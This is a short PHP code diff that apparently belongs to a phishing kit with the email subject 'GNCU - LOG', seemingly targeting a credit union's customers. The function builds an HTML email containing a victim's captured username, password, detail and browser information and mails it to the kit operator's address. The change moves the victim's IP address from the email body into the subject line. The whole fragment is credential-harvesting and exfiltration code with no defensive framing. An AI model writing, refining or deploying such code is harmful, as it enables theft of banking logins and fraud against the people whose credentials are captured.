@@ -90,11 +90,6 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
                     <p class='title'>Browser:</p>
                     <p class='content'>{{browser}}</p>
                 </div>
-    
-                <div class='flex'>
-                    <p class='title'>Ip Details:</p>
-                    <pre class='content'>{{ip}}</pre>
-                </div>
             </div>
         </body>
     </html>";
@@ -104,9 +99,9 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
     $message = str_replace("{{username}}", $values["username"], $message);
     $message = str_replace("{{password}}", $values["password"], $message);
     $message = str_replace("{{detail}}", $values["detail"], $message);
-    $message = str_replace("{{ip}}", $values["ip"], $message);
+    $ip = $values["ip"];
 
-    return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
+    return mail($EMAIL, "$subject | $ip", $message, $headers, "-f$SENDER_EMAIL");
 }
 
 
